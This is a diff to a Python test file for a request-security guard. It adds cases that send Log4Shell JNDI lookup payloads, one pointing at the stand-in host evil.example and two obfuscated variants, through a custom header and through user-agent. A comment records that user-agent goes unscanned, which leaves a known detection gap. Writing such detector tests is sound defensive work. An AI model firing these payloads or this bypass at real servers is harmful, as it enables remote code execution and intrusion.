@@ -65,6 +65,10 @@ def _header_request(payload: str) -> MockGuardRequest:
     return MockGuardRequest(headers={"x-e2e-probe": payload})
 
 
+def _user_agent_header_request(payload: str) -> MockGuardRequest:
+    return MockGuardRequest(headers={"user-agent": payload})
+
+
 def _query_param_request(payload: str) -> MockGuardRequest:
     return MockGuardRequest(query_params={"q": payload})
 
@@ -548,6 +552,24 @@ _BACKTICK_SQL_KEYWORD_EXEMPTION_BYPASS_TARGETED_CASES: list[TargetedCase] = [
 ]
 
 
+_LOG4SHELL_USER_AGENT_EXCLUDED_HEADER_KNOWN_GAP_REASON = (
+    "detect_penetration_attempt's _scan_headers unconditionally skips "
+    "user-agent via the hardcoded _DEFAULT_EXCLUDED_HEADERS set in "
+    "guard_core/utils.py before any pattern, including the jndi pattern "
+    "extended to header context this round, ever runs against it; "
+    "excluded_detection_headers can only add to that set, never remove "
+    "from it, so no SecurityConfig can undo the exclusion. Extending the "
+    "jndi pattern's own context set (this round's scope) cannot reach "
+    "content the header-scanning loop never hands it in the first place. "
+    "Confirmed detected via a non-default-excluded header "
+    "(x-e2e-probe) and at the pattern layer directly (context='header'); "
+    "the same payload via user-agent specifically stays undetected "
+    "end-to-end. Lifting the user-agent exclusion is a change to a "
+    "different mechanism in a different file, affecting every detection "
+    "category's header scanning, not only jndi, so it stays a reported, "
+    "unresolved gap rather than an in-scope fix"
+)
+
 _ROUND6_CMD_SUBSTITUTION_TARGETED_CASES: list[TargetedCase] = [
     TargetedCase(
         "round6_log4shell_direct_ldap_query_param",
@@ -598,6 +620,39 @@ _ROUND6_CMD_SUBSTITUTION_TARGETED_CASES: list[TargetedCase] = [
         "round6_denylist_nmap_glued_backtick_raw_body",
         _raw_body_request("x`nmap`"),
         True,
+    ),
+    TargetedCase(
+        "round6_log4shell_direct_ldap_custom_header",
+        _header_request("${jndi:ldap://evil.example/a}"),
+        True,
+    ),
+    TargetedCase(
+        "round6_log4shell_obfuscated_lower_custom_header",
+        _header_request("${lower:j}ndi"),
+        True,
+    ),
+    TargetedCase(
+        "round6_log4shell_obfuscated_default_value_custom_header",
+        _header_request("${::-j}ndi"),
+        True,
+    ),
+    TargetedCase(
+        "round6_log4shell_direct_ldap_user_agent",
+        _user_agent_header_request("${jndi:ldap://evil.example/a}"),
+        False,
+        _LOG4SHELL_USER_AGENT_EXCLUDED_HEADER_KNOWN_GAP_REASON,
+    ),
+    TargetedCase(
+        "round6_log4shell_obfuscated_lower_user_agent",
+        _user_agent_header_request("${lower:j}ndi"),
+        False,
+        _LOG4SHELL_USER_AGENT_EXCLUDED_HEADER_KNOWN_GAP_REASON,
+    ),
+    TargetedCase(
+        "round6_log4shell_obfuscated_default_value_user_agent",
+        _user_agent_header_request("${::-j}ndi"),
+        False,
+        _LOG4SHELL_USER_AGENT_EXCLUDED_HEADER_KNOWN_GAP_REASON,
     ),
 ]
 
